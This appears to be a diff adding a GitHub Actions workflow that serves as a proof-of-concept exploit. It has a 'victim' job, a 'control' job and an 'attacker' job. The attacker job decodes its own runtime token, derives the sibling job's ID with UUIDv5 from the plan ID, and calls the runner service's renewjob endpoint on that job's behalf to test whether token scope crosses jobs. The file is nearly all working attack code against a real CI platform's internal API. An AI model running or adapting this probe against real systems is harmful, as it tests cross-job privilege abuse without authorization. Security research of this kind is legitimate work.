@@ -1,0 +1,39 @@
+name: Runner renew scope via run-actions origin
+on: workflow_dispatch
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  victim:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            for(let i=0;i<18;i++){core.info(`victim heartbeat ${i}`);await new Promise(r=>setTimeout(r,10000))}
+  control:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const token=process.env.ACTIONS_RUNTIME_TOKEN||''
+            const oidc=process.env.ACTIONS_ID_TOKEN_REQUEST_URL||''
+            const base=new URL('/',oidc)
+            const p=token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')
+            const c=JSON.parse(Buffer.from(p,'base64').toString('utf8'))
+            const r=await fetch(new URL('renewjob',base),{method:'POST',headers:{Authorization:`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify({planId:c.plan_id,jobId:c.job_id})})
+            core.info(`CONTROL run-actions-origin own renew=${r.status} body=${(await r.text()).slice(0,300)}`)
+  attacker:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const crypto=require('crypto'),token=process.env.ACTIONS_RUNTIME_TOKEN||'',oidc=process.env.ACTIONS_ID_TOKEN_REQUEST_URL||'',base=new URL('/',oidc)
+            const p=token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/'),c=JSON.parse(Buffer.from(p,'base64').toString('utf8'))
+            function uuidBytes(u){return Buffer.from(u.replace(/-/g,''),'hex')}
+            function uuid5(ns,n){const h=crypto.createHash('sha1').update(Buffer.concat([uuidBytes(ns),Buffer.from(n)])).digest().subarray(0,16);h[6]=(h[6]&15)|80;h[8]=(h[8]&63)|128;const x=h.toString('hex');return `${x.slice(0,8)}-${x.slice(8,12)}-${x.slice(12,16)}-${x.slice(16,20)}-${x.slice(20)}`}
+            const victim=uuid5(c.plan_id,'victim.__default');core.info(`predicted victim=${victim}`);await new Promise(r=>setTimeout(r,20000))
+            const r=await fetch(new URL('renewjob',base),{method:'POST',headers:{Authorization:`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify({planId:c.plan_id,jobId:victim})})
+            core.info(`ATTACK run-actions-origin sibling renew=${r.status} body=${(await r.text()).slice(0,300)}`)
